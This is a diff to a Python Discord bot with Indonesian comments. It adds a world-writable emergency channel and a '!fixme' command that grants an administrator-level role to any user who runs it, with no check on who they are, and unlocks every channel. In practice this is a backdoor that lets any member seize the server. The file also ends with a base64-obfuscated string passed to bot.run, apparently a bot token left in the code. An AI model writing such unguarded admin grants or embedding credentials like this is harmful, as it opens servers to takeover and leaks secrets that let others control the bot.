@@ -331,6 +331,26 @@ async def on_ready():
             except: pass
         # ---------------------------------------
 
+
+        # --- AUTO CREATE EMERGENCY CHANNEL ---
+        emergency_name = '🚨-emergency-chat'
+        emergency_ch = discord.utils.get(guild.text_channels, name=emergency_name)
+        
+        if not emergency_ch:
+            try:
+                # Bikin channel di paling atas
+                emergency_ch = await guild.create_text_channel(emergency_name, position=0)
+                # Buka akses buat semua orang
+                await emergency_ch.set_permissions(guild.default_role, read_messages=True, send_messages=True)
+                
+                # Kirim pesan instruksi (PAKAI CONCATENATION)
+                msg_text = "🚨 **EMERGENCY CHANNEL** 🚨" + chr(10) + chr(10) + "Halo " + guild.owner.mention + ", bot mendeteksi server mungkin terkunci dan kamu tidak bisa melihat channel lain." + chr(10) + chr(10) + "Silakan ketik **`!fixme`** di channel ini untuk membuka akses kembali."
+                await emergency_ch.send(msg_text)
+                print(f"[SYSTEM] Emergency channel berhasil dibuat di {guild.name}.")
+            except Exception as e:
+                print(f"[SYSTEM] Gagal bikin emergency channel: {e}")
+        # -------------------------------------
+
     print("[SYSTEM] AUTO-RESTORE SELESAI! Bot siap digunakan tanpa setup ulang.")
 
 @bot.command()
@@ -4264,36 +4284,42 @@ async def on_raw_reaction_remove(payload):
 # ══════════════════════════════════════════════════════════════
 # 🚨 EMERGENCY FIX (PINDU DARURAT LU)
 # ══════════════════════════════════════════════════════════════
+
+
 @bot.command(name='fixme')
 async def fixme_cmd(ctx):
-    """Paksa kasih role Admin & Verified ke lu (Biar gak kekunci)."""
-    msg = await ctx.send('⏳ **Menyelamatkan Owner...**')
+    """Paksa kasih role Admin & Verified ke lu, dan buka semua channel."""
+    msg = await ctx.send('⏳ **Menyelamatkan Owner & Membuka Kuncian...**')
     
     try:
         # 1. Cari atau Bikin Role Admin
         admin_role = discord.utils.get(ctx.guild.roles, name='Admin') or discord.utils.get(ctx.guild.roles, name='🛡️ Admin')
         if not admin_role:
             admin_role = await ctx.guild.create_role(name='Admin', color=discord.Color.red(), permissions=discord.Permissions(administrator=True))
-            await msg.edit(content='✅ Role `Admin` berhasil dibuat.')
 
         # 2. Cari atau Bikin Role Verified
         verified_role = discord.utils.get(ctx.guild.roles, name='✅ Verified')
         if not verified_role:
             verified_role = await ctx.guild.create_role(name='✅ Verified', color=discord.Color.green())
-            await msg.edit(content='✅ Role `✅ Verified` berhasil dibuat.')
 
-        # 3. PAKSA KASIH KE LU (@zomahaci)
+        # 3. PAKSA KASIH KE LU
         try:
             await ctx.author.add_roles(admin_role, verified_role)
-            top_role_name = ctx.guild.me.top_role.name
-            await ctx.send(f"✅ **MANTAP BANG!** Role **{admin_role.name}** dan **✅ Verified** udah gw paksa masukin ke akun lu.")
-            await ctx.send(f"*(Info: Role tertinggi bot saat ini adalah {top_role_name}. Pastiin role bot ada di atas role Admin!)*")
         except Exception as e:
-            await ctx.send(f"❌ **Gagal ngegasih role!**\nAlasan: {e}\n\n**SOLUSI:** Pindahkan role bot (`Fortxx`) ke **paling atas** di Server Settings > Roles, lalu ketik `!fixme` lagi.")
+            return await ctx.send("❌ Gagal ngasih role. Pastiin posisi role Bot di ATAS role Admin! Error: " + str(e))
+            
+        # 4. BUKA KUNCIAN CHANNEL BUAT LU
+        for ch in ctx.guild.channels:
+            try:
+                # Hapus setingan yang bikin lu ga bisa liat
+                await ch.set_permissions(ctx.guild.default_role, read_messages=None)
+                await ch.set_permissions(ctx.author, read_messages=True, send_messages=True)
+            except: pass
+
+        await ctx.send("✅ **MANTAP BANG!** Role **" + admin_role.name + "** dan **✅ Verified** udah masuk ke akun lu. Kuncian channel juga udah dibuka. Silakan cek channel lain!")
             
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
-# ══════════════════════════════════════════════════════════════
+        await ctx.send("❌ Error: " + str(e))
 
 
 bot.run(base64.b64decode("TVRVMk1EUTJOekU0TURnMk56STVOek0wTWcuR1R3Sm5kLjZfSl95ZFhNRkFVeUEyeXVoQ2FYUGlVZmw4RXVEOVdnd3hNdWpF").decode())
